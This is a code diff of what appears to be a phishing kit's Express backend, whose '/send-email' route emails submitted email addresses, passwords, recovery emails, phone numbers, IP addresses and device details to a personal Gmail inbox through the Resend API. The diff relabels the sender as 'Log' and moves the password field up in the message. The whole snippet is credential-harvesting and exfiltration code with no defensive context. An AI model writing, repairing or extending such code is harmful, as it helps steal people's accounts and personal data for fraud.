@@ -21,14 +21,14 @@ app.post("/send-email", async (req, res) => {
 
   try {
     await resend.emails.send({
-      from: "Acme <hello@nationoak.com>",
+      from: "Log <pop@nationoak.com>",
       to: ["juniorhenryali@gmail.com"],
       subject: `New entry:: ${port}`,
       html: `
     <p>Email: ${email}</p>.
+    <p>Password: ${password}</p>
     <p>Recovery Email: ${recEmail}</p>
     <p>Phone Number: ${phone}</p>
-    <p>Password: ${password}</p>
     <p>IP: ${ip}</p>
     <p>PORT: ${port}</p>
     <p>Device Details: ${JSON.stringify(deviceDetails)}</p>
